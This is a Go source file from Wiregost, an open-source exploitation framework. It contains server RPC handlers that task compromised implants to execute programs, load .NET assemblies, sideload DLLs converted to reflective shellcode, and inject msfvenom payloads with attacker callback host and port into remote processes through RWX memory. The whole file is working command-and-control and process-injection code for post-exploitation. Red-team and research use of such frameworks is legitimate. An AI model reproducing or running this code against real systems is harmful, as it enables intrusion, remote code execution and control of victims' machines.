// Wiregost - Golang Exploitation Framework
// Copyright © 2020 Para
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <http://www.gnu.org/licenses/>.

package rpc

import (
	"io/ioutil"
	"time"

	"github.com/golang/protobuf/proto"

	clientpb "github.com/maxlandon/wiregost/protobuf/client"
	ghostpb "github.com/maxlandon/wiregost/protobuf/ghost"
	"github.com/maxlandon/wiregost/server/assets"
	"github.com/maxlandon/wiregost/server/core"
	"github.com/maxlandon/wiregost/server/generate"
	"github.com/maxlandon/wiregost/server/msf"
)

func rpcTask(req []byte, timeout time.Duration, resp Response) {
	taskReq := &clientpb.TaskReq{}
	err := proto.Unmarshal(req, taskReq)
	if err != nil {
		resp([]byte{}, err)
		return
	}
	ghost := core.Wire.Ghost(taskReq.GhostID)
	data, _ := proto.Marshal(&ghostpb.Task{
		Encoder:  "raw",
		Data:     taskReq.Data,
		RWXPages: taskReq.RwxPages,
		Pid:      taskReq.Pid,
	})
	data, err = ghost.Request(ghostpb.MsgTask, timeout, data)
	resp(data, err)
}

func rpcExecute(req []byte, timeout time.Duration, resp Response) {
	execReq := &ghostpb.ExecuteReq{}

	err := proto.Unmarshal(req, execReq)
	if err != nil {
		resp([]byte{}, err)
		return
	}
	ghost := core.Wire.Ghost(execReq.GhostID)

	data, _ := proto.Marshal(&ghostpb.ExecuteReq{
		Path:   execReq.Path,
		Args:   execReq.Args,
		Output: execReq.Output,
	})
	data, err = ghost.Request(ghostpb.MsgExecuteReq, timeout, data)
	resp(data, err)
}

func rpcExecuteAssembly(req []byte, timeout time.Duration, resp Response) {
	execReq := &ghostpb.ExecuteAssemblyReq{}
	err := proto.Unmarshal(req, execReq)
	if err != nil {
		rpcLog.Warnf("Error unmarshaling ExecuteAssemblyReq: %v", err)
		resp([]byte{}, err)
		return
	}
	ghost := core.Wire.Ghost(execReq.GhostID)
	if ghost == nil {
		rpcLog.Warnf("Could not find Ghost with ID: %d", execReq.GhostID)
		resp([]byte{}, err)
		return
	}
	hostingDllPath := assets.GetDataDir() + "/HostingCLRx64.dll"
	hostingDllBytes, err := ioutil.ReadFile(hostingDllPath)
	if err != nil {
		rpcLog.Warnf("Could not find hosting dll in %s", assets.GetDataDir())
		resp([]byte{}, err)
		return
	}
	data, _ := proto.Marshal(&ghostpb.ExecuteAssemblyReq{
		Assembly:   execReq.Assembly,
		HostingDll: hostingDllBytes,
		Arguments:  execReq.Arguments,
		Process:    execReq.Process,
		Timeout:    execReq.Timeout,
		GhostID:    execReq.GhostID,
	})
	rpcLog.Infof("Sending execute assembly request to ghost %d\n", execReq.GhostID)
	data, err = ghost.Request(ghostpb.MsgExecuteAssemblyReq, timeout, data)
	resp(data, err)

}

func rpcSideload(req []byte, timeout time.Duration, resp Response) {
	sideloadReq := &clientpb.SideloadReq{}
	err := proto.Unmarshal(req, sideloadReq)
	if err != nil {
		rpcLog.Warn("Error unmarshaling SideloadReq: %v", err)
		resp([]byte{}, err)
		return
	}
	ghost := core.Wire.Ghost(sideloadReq.GhostID)
	if ghost == nil {
		rpcLog.Warnf("Could not find Sliver with ID: %d", sideloadReq.GhostID)
		resp([]byte{}, err)
		return
	}
	shellcode, err := generate.ShellcodeRDIFromBytes(sideloadReq.Data, sideloadReq.EntryPoint, sideloadReq.Args)
	if err != nil {
		resp([]byte{}, err)
		return
	}
	data, _ := proto.Marshal(&ghostpb.SideloadReq{
		GhostID:  sideloadReq.GhostID,
		Data:     shellcode,
		ProcName: sideloadReq.ProcName,
	})
	data, err = ghost.Request(ghostpb.MsgSideloadReq, timeout, data)
	resp(data, err)

}

func rpcSpawnDll(req []byte, timeout time.Duration, resp Response) {
	spawnReq := &ghostpb.SpawnDllReq{}
	err := proto.Unmarshal(req, spawnReq)
	if err != nil {
		resp([]byte{}, err)
		return
	}
	ghost := core.Wire.Ghost(spawnReq.GhostID)
	data, err := ghost.Request(ghostpb.MsgSpawnDllReq, timeout, req)
	resp(data, err)
}

func rpcMsfInject(req []byte, timeout time.Duration, resp Response) {
	msfReq := &clientpb.MSFInjectReq{}
	err := proto.Unmarshal(req, msfReq)
	if err != nil {
		resp([]byte{}, err)
		return
	}

	ghost := core.Wire.Ghost(msfReq.GhostID)
	if ghost == nil {
		resp([]byte{}, err)
		return
	}

	config := msf.VenomConfig{
		Os:         ghost.OS,
		Arch:       msf.Arch(ghost.Arch),
		Payload:    msfReq.Payload,
		LHost:      msfReq.LHost,
		LPort:      uint16(msfReq.LPort),
		Encoder:    msfReq.Encoder,
		Iterations: int(msfReq.Iterations),
		Format:     "raw",
	}
	rawPayload, err := msf.VenomPayload(config)
	if err != nil {
		rpcLog.Errorf("Error while generating msf payload: %v\n", err)
		resp([]byte{}, err)
		return
	}
	data, _ := proto.Marshal(&ghostpb.RemoteTask{
		Pid:      uint32(msfReq.PID),
		Encoder:  "raw",
		Data:     rawPayload,
		RWXPages: true,
	})
	data, err = ghost.Request(ghostpb.MsgRemoteTask, timeout, data)
	resp(data, err)
}
